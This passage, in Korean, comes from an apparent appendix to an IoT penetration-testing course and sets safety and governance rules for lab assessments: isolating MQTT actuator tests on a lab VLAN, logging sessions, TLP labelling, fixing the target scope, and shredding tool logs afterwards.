3. **MQTT publish 격리** — 평가 시 mosquitto_pub 으로 actuator 명령 시뮬은
   *반드시 lab vlan 한정*. 운영 actuator 트리거 시 물리 사고.
4. **데이터 채증** — 모든 명령 + stdout/stderr 보관 (`script -t /tmp/eval.tlog`).
   사고 시 책임 입증.
5. **TLP 분류** — 보고서 기본 AMBER. 외부 공유 시 RED → AMBER 강등은 법무
   서명.
6. **IoT 자산 inventory** — 평가 전 *대상 IoT 목록* 명문화. 범위 외 IoT 절대
   접근 금지.
7. **사후 정리** — sqlmap dump / hydra log / pcap 모두 24h 내 shred. 보존
   필요 시 암호화 봉인.

> 본 부록은 *학습 평가용 OSS 통합 시퀀스* 이다. 실제 IoT 침투 테스트는
> RoE + 위촉 + 동의 + 격리 4 요건 충족 시에만 수행한다. 본 코스 이수가
> *권한* 을 부여하지 않으며 — *책임* 만 부여한다.

---
